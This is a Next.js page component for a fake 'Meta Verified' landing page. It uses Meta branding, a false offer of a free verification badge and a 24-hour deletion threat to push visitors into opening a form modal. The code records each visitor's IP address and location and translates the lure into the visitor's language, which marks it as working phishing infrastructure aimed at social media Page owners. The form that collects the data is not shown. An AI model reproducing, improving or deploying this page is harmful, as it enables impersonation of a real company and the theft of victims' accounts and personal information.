'use client';

import MetaBanner from '@/assets/images/imagemeta.webp';
import MetaBanner1 from '@/assets/images/imagemeta1.webp';
import MetaLogo from '@/assets/images/unnamedmeta.png';
import Navbar from '@/components/navbar';
import { store } from '@/store/store';
import { getLanguageFromCountry, getTranslations } from '@/utils/translate';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

const LANDING_TEXTS = [
    'Upgrade your profile with Meta Verified — enjoy exclusive benefits.',
    'This form must be completed within 24 hours, or it will be permanently deleted.',
    'Page Eligibility for Free Verification Badge',
    'Meta Verified Logo',
    "Your Page is eligible to receive a free verification badge. Verification helps confirm your Page's authenticity, increase audience trust, and protect your brand from impersonation. Please complete the verification request within 24 hours to secure your eligibility. Fill out the form below to submit your Page information for review.",
    'Get Meta Verified',
    'Are you a business?',
    'Get more information on',
    'Meta Verified for businesses',
    'Meta Verified Example',
    'Meta Verified benefits',
    'Verified badge',
    'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.',
    'Impersonation protection',
    'Enhanced support',
    'Upgraded profile features',
    'Meta Verified Benefits Demo'
] as const;

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [modalKey, setModalKey] = useState(0);

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        document.title = 'Meta Verified';
    }, []);

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US',
                    region: data.region || ''
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo || Object.keys(translations).length > 0) {
            return;
        }

        (async () => {
            const langMap: Record<string, string> = { VN: 'vi' };
            const lang = langMap[geoInfo.country_code];
            if (lang && lang !== 'en') {
                setTranslations(getTranslations(lang));
                return;
            }

            const targetLang = getLanguageFromCountry(geoInfo.country_code);
            if (targetLang === 'en') {
                return;
            }

            const CACHE_KEY = 'translation_cache';
            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
            const cache = cached ? JSON.parse(cached) : {};

            const results = await Promise.all(
                LANDING_TEXTS.map(async (text) => {
                    const cacheKey = `en:${targetLang}:${text}`;
                    if (cache[cacheKey]) {
                        return { text, translated: cache[cacheKey] as string };
                    }

                    try {
                        const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
                            params: {
                                client: 'gtx',
                                sl: 'en',
                                tl: targetLang,
                                dt: 't',
                                q: text
                            }
                        });
                        const translatedText =
                            response.data[0]
                                ?.map((item: unknown[]) => item[0])
                                .filter(Boolean)
                                .join('') || text;
                        cache[cacheKey] = translatedText;
                        return { text, translated: translatedText };
                    } catch {
                        return { text, translated: text };
                    }
                })
            );

            if (typeof window !== 'undefined') {
                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
            }

            const translatedMap: Record<string, string> = {};
            results.forEach(({ text, translated }) => {
                translatedMap[text] = translated;
            });
            setTranslations(translatedMap);
        })();
    }, [geoInfo, translations]);

    return (
        <>
            <Navbar />
            <div className='landing-page'>
                <div className='landing-banner'>
                    {t('Upgrade your profile with Meta Verified — enjoy exclusive benefits.')}
                    <br />
                    <span className='landing-banner-sub'>
                        {t('This form must be completed within 24 hours, or it will be permanently deleted.')}
                    </span>
                </div>

                <div className='landing-hero'>
                    <div className='landing-hero-text'>
                        <Image
                            src={MetaLogo}
                            alt={t('Meta Verified Logo')}
                            width={128}
                            height={128}
                            className='landing-hero-logo'
                            priority
                        />
                        <h1>{t('Page Eligibility for Free Verification Badge')}</h1>
                        <p className='landing-hero-desc'>
                            {t(
                                "Your Page is eligible to receive a free verification badge. Verification helps confirm your Page's authenticity, increase audience trust, and protect your brand from impersonation. Please complete the verification request within 24 hours to secure your eligibility. Fill out the form below to submit your Page information for review."
                            )}
                        </p>
                        <button
                            type='button'
                            className='btn-primary-pill'
                            onClick={() => {
                                setModalKey((prev) => prev + 1);
                                setModalOpen(true);
                            }}
                        >
                            {t('Get Meta Verified')}
                        </button>
                        <p className='landing-business-note'>
                            <strong>{t('Are you a business?')}</strong> {t('Get more information on')}{' '}
                            <a href='https://www.meta.com/meta-verified/' target='_blank' rel='noopener noreferrer'>
                                {t('Meta Verified for businesses')}
                            </a>
                            .
                        </p>
                    </div>
                    <div className='landing-hero-visual'>
                        <Image src={MetaBanner} alt={t('Meta Verified Example')} width={600} height={400} priority />
                    </div>
                </div>

                <section className='landing-benefits'>
                    <div className='landing-benefits-col'>
                        <h2>{t('Meta Verified benefits')}</h2>
                        <div className='benefits-divider' />
                        <div className='benefit-row'>
                            <div>
                                <div className='benefit-row-title'>{t('Verified badge')}</div>
                                <div className='benefit-row-desc'>
                                    {t(
                                        'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.'
                                    )}
                                </div>
                            </div>
                        </div>
                        <div className='benefits-divider' style={{ borderColor: '#e5e7eb' }} />
                        <div className='benefit-row'>
                            <span className='benefit-row-title'>{t('Impersonation protection')}</span>
                            <span className='benefit-row-plus'>+</span>
                        </div>
                        <div className='benefits-divider' style={{ borderColor: '#e5e7eb' }} />
                        <div className='benefit-row'>
                            <span className='benefit-row-title'>{t('Enhanced support')}</span>
                            <span className='benefit-row-plus'>+</span>
                        </div>
                        <div className='benefits-divider' style={{ borderColor: '#e5e7eb' }} />
                        <div className='benefit-row'>
                            <span className='benefit-row-title'>{t('Upgraded profile features')}</span>
                            <span className='benefit-row-plus'>+</span>
                        </div>
                        <div className='benefits-divider' style={{ borderColor: '#e5e7eb' }} />
                    </div>
                    <div className='landing-benefits-col landing-benefits-visual'>
                        <div className='benefits-image-wrap'>
                            <Image
                                src={MetaBanner1}
                                alt={t('Meta Verified Benefits Demo')}
                                width={600}
                                height={400}
                                priority
                            />
                        </div>
                    </div>
                </section>
            </div>
            {isModalOpen ? <FormModal key={modalKey} /> : null}
        </>
    );
};

export default Page;
